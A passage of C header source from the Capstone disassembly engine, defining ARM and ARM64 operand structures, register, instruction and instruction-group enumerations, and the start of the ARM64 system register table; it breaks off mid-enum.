	ARM_VECTORDATA_S32F64,	// s32.f64
	ARM_VECTORDATA_U16F64,	// u16.f64
	ARM_VECTORDATA_U16F32,	// u16.f32
	ARM_VECTORDATA_U32F64,	// u32.f64
	ARM_VECTORDATA_F64U16,	// f64.u16
	ARM_VECTORDATA_F32U16,	// f32.u16
	ARM_VECTORDATA_F64U32,	// f64.u32
} arm_vectordata_type;

// Instruction's operand referring to memory
// This is associated with ARM_OP_MEM operand type above
typedef struct arm_op_mem {
	unsigned int base;	// base register
	unsigned int index;	// index register
	int scale;	// scale for index register (can be 1, or -1)
	int disp;	// displacement/offset value
} arm_op_mem;

// Instruction operand
typedef struct cs_arm_op {
	int vector_index;	// Vector Index for some vector operands (or -1 if irrelevant)
	struct {
		arm_shifter type;
		unsigned int value;
	} shift;
	arm_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG/SYSREG operand
		int32_t imm;			// immediate value for C-IMM, P-IMM or IMM operand
		double fp;			// floating point value for FP operand
		arm_op_mem mem;		// base/index/scale/disp value for MEM operand
		arm_setend_type setend; // SETEND instruction's operand type
	};
	// in some instructions, an operand can be subtracted or added to
	// the base register,
	bool subtracted; // if TRUE, this operand is subtracted. otherwise, it is added.
} cs_arm_op;

// Instruction structure
typedef struct cs_arm {
	bool usermode;	// User-mode registers to be loaded (for LDM/STM instructions)
	int vector_size; 	// Scalar size for vector instructions
	arm_vectordata_type vector_data; // Data type for elements of vector instructions
	arm_cpsmode_type cps_mode;	// CPS mode for CPS instruction
	arm_cpsflag_type cps_flag;	// CPS mode for CPS instruction
	arm_cc cc;			// conditional code for this insn
	bool update_flags;	// does this insn update flags?
	bool writeback;		// does this insn write-back?
	arm_mem_barrier mem_barrier;	// Option for some memory barrier instructions

	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;

	cs_arm_op operands[36];	// operands for this instruction.
} cs_arm;

//> ARM registers
typedef enum arm_reg {
	ARM_REG_INVALID = 0,
	ARM_REG_APSR,
	ARM_REG_APSR_NZCV,
	ARM_REG_CPSR,
	ARM_REG_FPEXC,
	ARM_REG_FPINST,
	ARM_REG_FPSCR,
	ARM_REG_FPSCR_NZCV,
	ARM_REG_FPSID,
	ARM_REG_ITSTATE,
	ARM_REG_LR,
	ARM_REG_PC,
	ARM_REG_SP,
	ARM_REG_SPSR,
	ARM_REG_D0,
	ARM_REG_D1,
	ARM_REG_D2,
	ARM_REG_D3,
	ARM_REG_D4,
	ARM_REG_D5,
	ARM_REG_D6,
	ARM_REG_D7,
	ARM_REG_D8,
	ARM_REG_D9,
	ARM_REG_D10,
	ARM_REG_D11,
	ARM_REG_D12,
	ARM_REG_D13,
	ARM_REG_D14,
	ARM_REG_D15,
	ARM_REG_D16,
	ARM_REG_D17,
	ARM_REG_D18,
	ARM_REG_D19,
	ARM_REG_D20,
	ARM_REG_D21,
	ARM_REG_D22,
	ARM_REG_D23,
	ARM_REG_D24,
	ARM_REG_D25,
	ARM_REG_D26,
	ARM_REG_D27,
	ARM_REG_D28,
	ARM_REG_D29,
	ARM_REG_D30,
	ARM_REG_D31,
	ARM_REG_FPINST2,
	ARM_REG_MVFR0,
	ARM_REG_MVFR1,
	ARM_REG_MVFR2,
	ARM_REG_Q0,
	ARM_REG_Q1,
	ARM_REG_Q2,
	ARM_REG_Q3,
	ARM_REG_Q4,
	ARM_REG_Q5,
	ARM_REG_Q6,
	ARM_REG_Q7,
	ARM_REG_Q8,
	ARM_REG_Q9,
	ARM_REG_Q10,
	ARM_REG_Q11,
	ARM_REG_Q12,
	ARM_REG_Q13,
	ARM_REG_Q14,
	ARM_REG_Q15,
	ARM_REG_R0,
	ARM_REG_R1,
	ARM_REG_R2,
	ARM_REG_R3,
	ARM_REG_R4,
	ARM_REG_R5,
	ARM_REG_R6,
	ARM_REG_R7,
	ARM_REG_R8,
	ARM_REG_R9,
	ARM_REG_R10,
	ARM_REG_R11,
	ARM_REG_R12,
	ARM_REG_S0,
	ARM_REG_S1,
	ARM_REG_S2,
	ARM_REG_S3,
	ARM_REG_S4,
	ARM_REG_S5,
	ARM_REG_S6,
	ARM_REG_S7,
	ARM_REG_S8,
	ARM_REG_S9,
	ARM_REG_S10,
	ARM_REG_S11,
	ARM_REG_S12,
	ARM_REG_S13,
	ARM_REG_S14,
	ARM_REG_S15,
	ARM_REG_S16,
	ARM_REG_S17,
	ARM_REG_S18,
	ARM_REG_S19,
	ARM_REG_S20,
	ARM_REG_S21,
	ARM_REG_S22,
	ARM_REG_S23,
	ARM_REG_S24,
	ARM_REG_S25,
	ARM_REG_S26,
	ARM_REG_S27,
	ARM_REG_S28,
	ARM_REG_S29,
	ARM_REG_S30,
	ARM_REG_S31,

	ARM_REG_ENDING,		// <-- mark the end of the list or registers

	//> alias registers
	ARM_REG_R13 = ARM_REG_SP,
	ARM_REG_R14 = ARM_REG_LR,
	ARM_REG_R15 = ARM_REG_PC,

	ARM_REG_SB = ARM_REG_R9,
	ARM_REG_SL = ARM_REG_R10,
	ARM_REG_FP = ARM_REG_R11,
	ARM_REG_IP = ARM_REG_R12,
} arm_reg;

//> ARM instruction
typedef enum arm_insn {
	ARM_INS_INVALID = 0,

	ARM_INS_ADC,
	ARM_INS_ADD,
	ARM_INS_ADR,
	ARM_INS_AESD,
	ARM_INS_AESE,
	ARM_INS_AESIMC,
	ARM_INS_AESMC,
	ARM_INS_AND,
	ARM_INS_BFC,
	ARM_INS_BFI,
	ARM_INS_BIC,
	ARM_INS_BKPT,
	ARM_INS_BL,
	ARM_INS_BLX,
	ARM_INS_BX,
	ARM_INS_BXJ,
	ARM_INS_B,
	ARM_INS_CDP,
	ARM_INS_CDP2,
	ARM_INS_CLREX,
	ARM_INS_CLZ,
	ARM_INS_CMN,
	ARM_INS_CMP,
	ARM_INS_CPS,
	ARM_INS_CRC32B,
	ARM_INS_CRC32CB,
	ARM_INS_CRC32CH,
	ARM_INS_CRC32CW,
	ARM_INS_CRC32H,
	ARM_INS_CRC32W,
	ARM_INS_DBG,
	ARM_INS_DMB,
	ARM_INS_DSB,
	ARM_INS_EOR,
	ARM_INS_VMOV,
	ARM_INS_FLDMDBX,
	ARM_INS_FLDMIAX,
	ARM_INS_VMRS,
	ARM_INS_FSTMDBX,
	ARM_INS_FSTMIAX,
	ARM_INS_HINT,
	ARM_INS_HLT,
	ARM_INS_ISB,
	ARM_INS_LDA,
	ARM_INS_LDAB,
	ARM_INS_LDAEX,
	ARM_INS_LDAEXB,
	ARM_INS_LDAEXD,
	ARM_INS_LDAEXH,
	ARM_INS_LDAH,
	ARM_INS_LDC2L,
	ARM_INS_LDC2,
	ARM_INS_LDCL,
	ARM_INS_LDC,
	ARM_INS_LDMDA,
	ARM_INS_LDMDB,
	ARM_INS_LDM,
	ARM_INS_LDMIB,
	ARM_INS_LDRBT,
	ARM_INS_LDRB,
	ARM_INS_LDRD,
	ARM_INS_LDREX,
	ARM_INS_LDREXB,
	ARM_INS_LDREXD,
	ARM_INS_LDREXH,
	ARM_INS_LDRH,
	ARM_INS_LDRHT,
	ARM_INS_LDRSB,
	ARM_INS_LDRSBT,
	ARM_INS_LDRSH,
	ARM_INS_LDRSHT,
	ARM_INS_LDRT,
	ARM_INS_LDR,
	ARM_INS_MCR,
	ARM_INS_MCR2,
	ARM_INS_MCRR,
	ARM_INS_MCRR2,
	ARM_INS_MLA,
	ARM_INS_MLS,
	ARM_INS_MOV,
	ARM_INS_MOVT,
	ARM_INS_MOVW,
	ARM_INS_MRC,
	ARM_INS_MRC2,
	ARM_INS_MRRC,
	ARM_INS_MRRC2,
	ARM_INS_MRS,
	ARM_INS_MSR,
	ARM_INS_MUL,
	ARM_INS_MVN,
	ARM_INS_ORR,
	ARM_INS_PKHBT,
	ARM_INS_PKHTB,
	ARM_INS_PLDW,
	ARM_INS_PLD,
	ARM_INS_PLI,
	ARM_INS_QADD,
	ARM_INS_QADD16,
	ARM_INS_QADD8,
	ARM_INS_QASX,
	ARM_INS_QDADD,
	ARM_INS_QDSUB,
	ARM_INS_QSAX,
	ARM_INS_QSUB,
	ARM_INS_QSUB16,
	ARM_INS_QSUB8,
	ARM_INS_RBIT,
	ARM_INS_REV,
	ARM_INS_REV16,
	ARM_INS_REVSH,
	ARM_INS_RFEDA,
	ARM_INS_RFEDB,
	ARM_INS_RFEIA,
	ARM_INS_RFEIB,
	ARM_INS_RSB,
	ARM_INS_RSC,
	ARM_INS_SADD16,
	ARM_INS_SADD8,
	ARM_INS_SASX,
	ARM_INS_SBC,
	ARM_INS_SBFX,
	ARM_INS_SDIV,
	ARM_INS_SEL,
	ARM_INS_SETEND,
	ARM_INS_SHA1C,
	ARM_INS_SHA1H,
	ARM_INS_SHA1M,
	ARM_INS_SHA1P,
	ARM_INS_SHA1SU0,
	ARM_INS_SHA1SU1,
	ARM_INS_SHA256H,
	ARM_INS_SHA256H2,
	ARM_INS_SHA256SU0,
	ARM_INS_SHA256SU1,
	ARM_INS_SHADD16,
	ARM_INS_SHADD8,
	ARM_INS_SHASX,
	ARM_INS_SHSAX,
	ARM_INS_SHSUB16,
	ARM_INS_SHSUB8,
	ARM_INS_SMC,
	ARM_INS_SMLABB,
	ARM_INS_SMLABT,
	ARM_INS_SMLAD,
	ARM_INS_SMLADX,
	ARM_INS_SMLAL,
	ARM_INS_SMLALBB,
	ARM_INS_SMLALBT,
	ARM_INS_SMLALD,
	ARM_INS_SMLALDX,
	ARM_INS_SMLALTB,
	ARM_INS_SMLALTT,
	ARM_INS_SMLATB,
	ARM_INS_SMLATT,
	ARM_INS_SMLAWB,
	ARM_INS_SMLAWT,
	ARM_INS_SMLSD,
	ARM_INS_SMLSDX,
	ARM_INS_SMLSLD,
	ARM_INS_SMLSLDX,
	ARM_INS_SMMLA,
	ARM_INS_SMMLAR,
	ARM_INS_SMMLS,
	ARM_INS_SMMLSR,
	ARM_INS_SMMUL,
	ARM_INS_SMMULR,
	ARM_INS_SMUAD,
	ARM_INS_SMUADX,
	ARM_INS_SMULBB,
	ARM_INS_SMULBT,
	ARM_INS_SMULL,
	ARM_INS_SMULTB,
	ARM_INS_SMULTT,
	ARM_INS_SMULWB,
	ARM_INS_SMULWT,
	ARM_INS_SMUSD,
	ARM_INS_SMUSDX,
	ARM_INS_SRSDA,
	ARM_INS_SRSDB,
	ARM_INS_SRSIA,
	ARM_INS_SRSIB,
	ARM_INS_SSAT,
	ARM_INS_SSAT16,
	ARM_INS_SSAX,
	ARM_INS_SSUB16,
	ARM_INS_SSUB8,
	ARM_INS_STC2L,
	ARM_INS_STC2,
	ARM_INS_STCL,
	ARM_INS_STC,
	ARM_INS_STL,
	ARM_INS_STLB,
	ARM_INS_STLEX,
	ARM_INS_STLEXB,
	ARM_INS_STLEXD,
	ARM_INS_STLEXH,
	ARM_INS_STLH,
	ARM_INS_STMDA,
	ARM_INS_STMDB,
	ARM_INS_STM,
	ARM_INS_STMIB,
	ARM_INS_STRBT,
	ARM_INS_STRB,
	ARM_INS_STRD,
	ARM_INS_STREX,
	ARM_INS_STREXB,
	ARM_INS_STREXD,
	ARM_INS_STREXH,
	ARM_INS_STRH,
	ARM_INS_STRHT,
	ARM_INS_STRT,
	ARM_INS_STR,
	ARM_INS_SUB,
	ARM_INS_SVC,
	ARM_INS_SWP,
	ARM_INS_SWPB,
	ARM_INS_SXTAB,
	ARM_INS_SXTAB16,
	ARM_INS_SXTAH,
	ARM_INS_SXTB,
	ARM_INS_SXTB16,
	ARM_INS_SXTH,
	ARM_INS_TEQ,
	ARM_INS_TRAP,
	ARM_INS_TST,
	ARM_INS_UADD16,
	ARM_INS_UADD8,
	ARM_INS_UASX,
	ARM_INS_UBFX,
	ARM_INS_UDF,
	ARM_INS_UDIV,
	ARM_INS_UHADD16,
	ARM_INS_UHADD8,
	ARM_INS_UHASX,
	ARM_INS_UHSAX,
	ARM_INS_UHSUB16,
	ARM_INS_UHSUB8,
	ARM_INS_UMAAL,
	ARM_INS_UMLAL,
	ARM_INS_UMULL,
	ARM_INS_UQADD16,
	ARM_INS_UQADD8,
	ARM_INS_UQASX,
	ARM_INS_UQSAX,
	ARM_INS_UQSUB16,
	ARM_INS_UQSUB8,
	ARM_INS_USAD8,
	ARM_INS_USADA8,
	ARM_INS_USAT,
	ARM_INS_USAT16,
	ARM_INS_USAX,
	ARM_INS_USUB16,
	ARM_INS_USUB8,
	ARM_INS_UXTAB,
	ARM_INS_UXTAB16,
	ARM_INS_UXTAH,
	ARM_INS_UXTB,
	ARM_INS_UXTB16,
	ARM_INS_UXTH,
	ARM_INS_VABAL,
	ARM_INS_VABA,
	ARM_INS_VABDL,
	ARM_INS_VABD,
	ARM_INS_VABS,
	ARM_INS_VACGE,
	ARM_INS_VACGT,
	ARM_INS_VADD,
	ARM_INS_VADDHN,
	ARM_INS_VADDL,
	ARM_INS_VADDW,
	ARM_INS_VAND,
	ARM_INS_VBIC,
	ARM_INS_VBIF,
	ARM_INS_VBIT,
	ARM_INS_VBSL,
	ARM_INS_VCEQ,
	ARM_INS_VCGE,
	ARM_INS_VCGT,
	ARM_INS_VCLE,
	ARM_INS_VCLS,
	ARM_INS_VCLT,
	ARM_INS_VCLZ,
	ARM_INS_VCMP,
	ARM_INS_VCMPE,
	ARM_INS_VCNT,
	ARM_INS_VCVTA,
	ARM_INS_VCVTB,
	ARM_INS_VCVT,
	ARM_INS_VCVTM,
	ARM_INS_VCVTN,
	ARM_INS_VCVTP,
	ARM_INS_VCVTT,
	ARM_INS_VDIV,
	ARM_INS_VDUP,
	ARM_INS_VEOR,
	ARM_INS_VEXT,
	ARM_INS_VFMA,
	ARM_INS_VFMS,
	ARM_INS_VFNMA,
	ARM_INS_VFNMS,
	ARM_INS_VHADD,
	ARM_INS_VHSUB,
	ARM_INS_VLD1,
	ARM_INS_VLD2,
	ARM_INS_VLD3,
	ARM_INS_VLD4,
	ARM_INS_VLDMDB,
	ARM_INS_VLDMIA,
	ARM_INS_VLDR,
	ARM_INS_VMAXNM,
	ARM_INS_VMAX,
	ARM_INS_VMINNM,
	ARM_INS_VMIN,
	ARM_INS_VMLA,
	ARM_INS_VMLAL,
	ARM_INS_VMLS,
	ARM_INS_VMLSL,
	ARM_INS_VMOVL,
	ARM_INS_VMOVN,
	ARM_INS_VMSR,
	ARM_INS_VMUL,
	ARM_INS_VMULL,
	ARM_INS_VMVN,
	ARM_INS_VNEG,
	ARM_INS_VNMLA,
	ARM_INS_VNMLS,
	ARM_INS_VNMUL,
	ARM_INS_VORN,
	ARM_INS_VORR,
	ARM_INS_VPADAL,
	ARM_INS_VPADDL,
	ARM_INS_VPADD,
	ARM_INS_VPMAX,
	ARM_INS_VPMIN,
	ARM_INS_VQABS,
	ARM_INS_VQADD,
	ARM_INS_VQDMLAL,
	ARM_INS_VQDMLSL,
	ARM_INS_VQDMULH,
	ARM_INS_VQDMULL,
	ARM_INS_VQMOVUN,
	ARM_INS_VQMOVN,
	ARM_INS_VQNEG,
	ARM_INS_VQRDMULH,
	ARM_INS_VQRSHL,
	ARM_INS_VQRSHRN,
	ARM_INS_VQRSHRUN,
	ARM_INS_VQSHL,
	ARM_INS_VQSHLU,
	ARM_INS_VQSHRN,
	ARM_INS_VQSHRUN,
	ARM_INS_VQSUB,
	ARM_INS_VRADDHN,
	ARM_INS_VRECPE,
	ARM_INS_VRECPS,
	ARM_INS_VREV16,
	ARM_INS_VREV32,
	ARM_INS_VREV64,
	ARM_INS_VRHADD,
	ARM_INS_VRINTA,
	ARM_INS_VRINTM,
	ARM_INS_VRINTN,
	ARM_INS_VRINTP,
	ARM_INS_VRINTR,
	ARM_INS_VRINTX,
	ARM_INS_VRINTZ,
	ARM_INS_VRSHL,
	ARM_INS_VRSHRN,
	ARM_INS_VRSHR,
	ARM_INS_VRSQRTE,
	ARM_INS_VRSQRTS,
	ARM_INS_VRSRA,
	ARM_INS_VRSUBHN,
	ARM_INS_VSELEQ,
	ARM_INS_VSELGE,
	ARM_INS_VSELGT,
	ARM_INS_VSELVS,
	ARM_INS_VSHLL,
	ARM_INS_VSHL,
	ARM_INS_VSHRN,
	ARM_INS_VSHR,
	ARM_INS_VSLI,
	ARM_INS_VSQRT,
	ARM_INS_VSRA,
	ARM_INS_VSRI,
	ARM_INS_VST1,
	ARM_INS_VST2,
	ARM_INS_VST3,
	ARM_INS_VST4,
	ARM_INS_VSTMDB,
	ARM_INS_VSTMIA,
	ARM_INS_VSTR,
	ARM_INS_VSUB,
	ARM_INS_VSUBHN,
	ARM_INS_VSUBL,
	ARM_INS_VSUBW,
	ARM_INS_VSWP,
	ARM_INS_VTBL,
	ARM_INS_VTBX,
	ARM_INS_VCVTR,
	ARM_INS_VTRN,
	ARM_INS_VTST,
	ARM_INS_VUZP,
	ARM_INS_VZIP,
	ARM_INS_ADDW,
	ARM_INS_ASR,
	ARM_INS_DCPS1,
	ARM_INS_DCPS2,
	ARM_INS_DCPS3,
	ARM_INS_IT,
	ARM_INS_LSL,
	ARM_INS_LSR,
	ARM_INS_ASRS,
	ARM_INS_LSRS,
	ARM_INS_ORN,
	ARM_INS_ROR,
	ARM_INS_RRX,
	ARM_INS_SUBS,
	ARM_INS_SUBW,
	ARM_INS_TBB,
	ARM_INS_TBH,
	ARM_INS_CBNZ,
	ARM_INS_CBZ,
	ARM_INS_MOVS,
	ARM_INS_POP,
	ARM_INS_PUSH,

	// special instructions
	ARM_INS_NOP,
	ARM_INS_YIELD,
	ARM_INS_WFE,
	ARM_INS_WFI,
	ARM_INS_SEV,
	ARM_INS_SEVL,
	ARM_INS_VPUSH,
	ARM_INS_VPOP,

	ARM_INS_ENDING,	// <-- mark the end of the list of instructions
} arm_insn;

//> Group of ARM instructions
typedef enum arm_insn_group {
	ARM_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	ARM_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	ARM_GRP_CRYPTO = 128,
	ARM_GRP_DATABARRIER,
	ARM_GRP_DIVIDE,
	ARM_GRP_FPARMV8,
	ARM_GRP_MULTPRO,
	ARM_GRP_NEON,
	ARM_GRP_T2EXTRACTPACK,
	ARM_GRP_THUMB2DSP,
	ARM_GRP_TRUSTZONE,
	ARM_GRP_V4T,
	ARM_GRP_V5T,
	ARM_GRP_V5TE,
	ARM_GRP_V6,
	ARM_GRP_V6T2,
	ARM_GRP_V7,
	ARM_GRP_V8,
	ARM_GRP_VFP2,
	ARM_GRP_VFP3,
	ARM_GRP_VFP4,
	ARM_GRP_ARM,
	ARM_GRP_MCLASS,
	ARM_GRP_NOTMCLASS,
	ARM_GRP_THUMB,
	ARM_GRP_THUMB1ONLY,
	ARM_GRP_THUMB2,
	ARM_GRP_PREV8,
	ARM_GRP_FPVMLX,
	ARM_GRP_MULOPS,
	ARM_GRP_CRC,
	ARM_GRP_DPVFP,
	ARM_GRP_V6M,

	ARM_GRP_ENDING,
} arm_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/arm64.h`:

```h
#ifndef CAPSTONE_ARM64_H
#define CAPSTONE_ARM64_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> ARM64 shift type
typedef enum arm64_shifter {
	ARM64_SFT_INVALID = 0,
	ARM64_SFT_LSL = 1,
	ARM64_SFT_MSL = 2,
	ARM64_SFT_LSR = 3,
	ARM64_SFT_ASR = 4,
	ARM64_SFT_ROR = 5,
} arm64_shifter;

//> ARM64 extender type
typedef enum arm64_extender {
	ARM64_EXT_INVALID = 0,
	ARM64_EXT_UXTB = 1,
	ARM64_EXT_UXTH = 2,
	ARM64_EXT_UXTW = 3,
	ARM64_EXT_UXTX = 4,
	ARM64_EXT_SXTB = 5,
	ARM64_EXT_SXTH = 6,
	ARM64_EXT_SXTW = 7,
	ARM64_EXT_SXTX = 8,
} arm64_extender;

//> ARM64 condition code
typedef enum arm64_cc {
	ARM64_CC_INVALID = 0,
	ARM64_CC_EQ = 1,     // Equal
	ARM64_CC_NE = 2,     // Not equal:                 Not equal, or unordered
	ARM64_CC_HS = 3,     // Unsigned higher or same:   >, ==, or unordered
	ARM64_CC_LO = 4,     // Unsigned lower or same:    Less than
	ARM64_CC_MI = 5,     // Minus, negative:           Less than
	ARM64_CC_PL = 6,     // Plus, positive or zero:    >, ==, or unordered
	ARM64_CC_VS = 7,     // Overflow:                  Unordered
	ARM64_CC_VC = 8,     // No overflow:               Ordered
	ARM64_CC_HI = 9,     // Unsigned higher:           Greater than, or unordered
	ARM64_CC_LS = 10,     // Unsigned lower or same:    Less than or equal
	ARM64_CC_GE = 11,     // Greater than or equal:     Greater than or equal
	ARM64_CC_LT = 12,     // Less than:                 Less than, or unordered
	ARM64_CC_GT = 13,     // Signed greater than:       Greater than
	ARM64_CC_LE = 14,     // Signed less than or equal: <, ==, or unordered
	ARM64_CC_AL = 15,     // Always (unconditional):    Always (unconditional)
	ARM64_CC_NV = 16,     // Always (unconditional):   Always (unconditional)
	// Note the NV exists purely to disassemble 0b1111. Execution
	// is "always".
} arm64_cc;

//> System registers
typedef enum arm64_mrs_reg {
	//> System registers for MRS
	ARM64_SYSREG_INVALID           = 0,
	ARM64_SYSREG_MDCCSR_EL0        = 0x9808, // 10  011  0000  0001  000
	ARM64_SYSREG_DBGDTRRX_EL0      = 0x9828, // 10  011  0000  0101  000
	ARM64_SYSREG_MDRAR_EL1         = 0x8080, // 10  000  0001  0000  000
	ARM64_SYSREG_OSLSR_EL1         = 0x808c, // 10  000  0001  0001  100
	ARM64_SYSREG_DBGAUTHSTATUS_EL1 = 0x83f6, // 10  000  0111  1110  110
	ARM64_SYSREG_PMCEID0_EL0       = 0xdce6, // 11  011  1001  1100  110
	ARM64_SYSREG_PMCEID1_EL0       = 0xdce7, // 11  011  1001  1100  111
	ARM64_SYSREG_MIDR_EL1          = 0xc000, // 11  000  0000  0000  000
	ARM64_SYSREG_CCSIDR_EL1        = 0xc800, // 11  001  0000  0000  000
	ARM64_SYSREG_CLIDR_EL1         = 0xc801, // 11  001  0000  0000  001
	ARM64_SYSREG_CTR_EL0           = 0xd801, // 11  011  0000  0000  001
	ARM64_SYSREG_MPIDR_EL1         = 0xc005, // 11  000  0000  0000  101
	ARM64_SYSREG_REVIDR_EL1        = 0xc006, // 11  000  0000  0000  110
	ARM64_SYSREG_AIDR_EL1          = 0xc807, // 11  001  0000  0000  111
	ARM64_SYSREG_DCZID_EL0         = 0xd807, // 11  011  0000  0000  111
	ARM64_SYSREG_ID_PFR0_EL1       = 0xc008, // 11  000  0000  0001  000
	ARM64_SYSREG_ID_PFR1_EL1       = 0xc009, // 11  000  0000  0001  001
	ARM64_SYSREG_ID_DFR0_EL1       = 0xc00a, // 11  000  0000  0001  010
	ARM64_SYSREG_ID_AFR0_EL1       = 0xc00b, // 11  000  0000  0001  011
	ARM64_SYSREG_ID_MMFR0_EL1      = 0xc00c, // 11  000  0000  0001  100
	ARM64_SYSREG_ID_MMFR1_EL1      = 0xc00d, // 11  000  0000  0001  101
	ARM64_SYSREG_ID_MMFR2_EL1      = 0xc00e, // 11  000  0000  0001  110
	ARM64_SYSREG_ID_MMFR3_EL1      = 0xc00f, // 11  000  0000  0001  111
	ARM64_SYSREG_ID_ISAR0_EL1      = 0xc010, // 11  000  0000  0010  000
	ARM64_SYSREG_ID_ISAR1_EL1      = 0xc011, // 11  000  0000  0010  001
	ARM64_SYSREG_ID_ISAR2_EL1      = 0xc012, // 11  000  0000  0010  010
	ARM64_SYSREG_ID_ISAR3_EL1      = 0xc013, // 11  000  0000  0010  011
	ARM64_SYSREG_ID_ISAR4_EL1      = 0xc014, // 11  000  0000  0010  100
	ARM64_SYSREG_ID_ISAR5_EL1      = 0xc015, // 11  000  0000  0010  101
	ARM64_SYSREG_ID_A64PFR0_EL1   = 0xc020, // 11  000  0000  0100  000
	ARM64_SYSREG_ID_A64PFR1_EL1   = 0xc021, // 11  000  0000  0100  001
	ARM64_SYSREG_ID_A64DFR0_EL1   = 0xc028, // 11  000  0000  0101  000
	ARM64_SYSREG_ID_A64DFR1_EL1   = 0xc029, // 11  000  0000  0101  001
	ARM64_SYSREG_ID_A64AFR0_EL1   = 0xc02c, // 11  000  0000  0101  100
	ARM64_SYSREG_ID_A64AFR1_EL1   = 0xc02d, // 11  000  0000  0101  101
	ARM64_SYSREG_ID_A64ISAR0_EL1  = 0xc030, // 11  000  0000  0110  000
	ARM64_SYSREG_ID_A64ISAR1_EL1  = 0xc031, // 11  000  0000  0110  001
	ARM64_SYSREG_ID_A64MMFR0_EL1  = 0xc038, // 11  000  0000  0111  000
	ARM64_SYSREG_ID_A64MMFR1_EL1  = 0xc039, // 11  000  0000  0111  001
	ARM64_SYSREG_MVFR0_EL1         = 0xc018, // 11  000  0000  0011  000
	ARM64_SYSREG_MVFR1_EL1         = 0xc019, // 11  000  0000  0011  001
	ARM64_SYSREG_MVFR2_EL1         = 0xc01a, // 11  000  0000  0011  010
	ARM64_SYSREG_RVBAR_EL1         = 0xc601, // 11  000  1100  0000  001
	ARM64_SYSREG_RVBAR_EL2         = 0xe601, // 11  100  1100  0000  001
	ARM64_SYSREG_RVBAR_EL3         = 0xf601, // 11  110  1100  0000  001
	ARM64_SYSREG_ISR_EL1           = 0xc608, // 11  000  1100  0001  000
	ARM64_SYSREG_CNTPCT_EL0        = 0xdf01, // 11  011  1110  0000  001
	ARM64_SYSREG_CNTVCT_EL0        = 0xdf02,  // 11  011  1110  0000  010

	// Trace registers
	ARM64_SYSREG_TRCSTATR          = 0x8818, // 10  001  0000  0011  000
	ARM64_SYSREG_TRCIDR8           = 0x8806, // 10  001  0000  0000  110
	ARM64_SYSREG_TRCIDR9           = 0x880e, // 10  001  0000  0001  110
	ARM64_SYSREG_TRCIDR10          = 0x8816, // 10  001  0000  0010  110
	ARM64_SYSREG_TRCIDR11          = 0x881e, // 10  001  0000  0011  110
	ARM64_SYSREG_TRCIDR12          = 0x8826, // 10  001  0000  0100  110
	ARM64_SYSREG_TRCIDR13          = 0x882e, // 10  001  0000  0101  110
	ARM64_SYSREG_TRCIDR0           = 0x8847, // 10  001  0000  1000  111
	ARM64_SYSREG_TRCIDR1           = 0x884f, // 10  001  0000  1001  111
	ARM64_SYSREG_TRCIDR2           = 0x8857, // 10  001  0000  1010  111
	ARM64_SYSREG_TRCIDR3           = 0x885f, // 10  001  0000  1011  111
	ARM64_SYSREG_TRCIDR4           = 0x8867, // 10  001  0000  1100  111
	ARM64_SYSREG_TRCIDR5           = 0x886f, // 10  001  0000  1101  111
	ARM64_SYSREG_TRCIDR6           = 0x8877, // 10  001  0000  1110  111
	ARM64_SYSREG_TRCIDR7           = 0x887f, // 10  001  0000  1111  111
	ARM64_SYSREG_TRCOSLSR          = 0x888c, // 10  001  0001  0001  100
	ARM64_SYSREG_TRCPDSR           = 0x88ac, // 10  001  0001  0101  100
	ARM64_SYSREG_TRCDEVAFF0        = 0x8bd6, // 10  001  0111  1010  110
	ARM64_SYSREG_TRCDEVAFF1        = 0x8bde, // 10  001  0111  1011  110
	ARM64_SYSREG_TRCLSR            = 0x8bee, // 10  001  0111  1101  110
	ARM64_SYSREG_TRCAUTHSTATUS     = 0x8bf6, // 10  001  0111  1110  110
	ARM64_SYSREG_TRCDEVARCH        = 0x8bfe, // 10  001  0111  1111  110
	ARM64_SYSREG_TRCDEVID          = 0x8b97, // 10  001  0111  0010  111
	ARM64_SYSREG_TRCDEVTYPE        = 0x8b9f, // 10  001  0111  0011  111
	ARM64_SYSREG_TRCPIDR4          = 0x8ba7, // 10  001  0111  0100  111
	ARM64_SYSREG_TRCPIDR5          = 0x8baf, // 10  001  0111  0101  111
	ARM64_SYSREG_TRCPIDR6          = 0x8bb7, // 10  001  0111  0110  111
	ARM64_SYSREG_TRCPIDR7          = 0x8bbf, // 10  001  0111  0111  111
	ARM64_SYSREG_TRCPIDR0          = 0x8bc7, // 10  001  0111  1000  111
	ARM64_SYSREG_TRCPIDR1          = 0x8bcf, // 10  001  0111  1001  111
	ARM64_SYSREG_TRCPIDR2          = 0x8bd7, // 10  001  0111  1010  111
	ARM64_SYSREG_TRCPIDR3          = 0x8bdf, // 10  001  0111  1011  111
	ARM64_SYSREG_TRCCIDR0          = 0x8be7, // 10  001  0111  1100  111
	ARM64_SYSREG_TRCCIDR1          = 0x8bef, // 10  001  0111  1101  111
	ARM64_SYSREG_TRCCIDR2          = 0x8bf7, // 10  001  0111  1110  111
	ARM64_SYSREG_TRCCIDR3          = 0x8bff, // 10  001  0111  1111  111

	// GICv3 registers
	ARM64_SYSREG_ICC_IAR1_EL1      = 0xc660, // 11  000  1100  1100  000
	ARM64_SYSREG_ICC_IAR0_EL1      = 0xc640, // 11  000  1100  1000  000
	ARM64_SYSREG_ICC_HPPIR1_EL1    = 0xc662, // 11  000  1100  1100  010
	ARM64_SYSREG_ICC_HPPIR0_EL1    = 0xc642, // 11  000  1100  1000  010
	ARM64_SYSREG_ICC_RPR_EL1       = 0xc65b, // 11  000  1100  1011  011
	ARM64_SYSREG_ICH_VTR_EL2       = 0xe659, // 11  100  1100  1011  001
	ARM64_SYSREG_ICH_EISR_EL2      = 0xe65b, // 11  100  1100  1011  011
	ARM64_SYSREG_ICH_ELSR_EL2      = 0xe65d, // 11  100  1100  1011  101
} arm64_sysreg;

typedef enum arm64_msr_reg {
	//> System registers for MSR
	ARM64_SYSREG_DBGDTRTX_EL0      = 0x9828, // 10  011  0000  0101  000
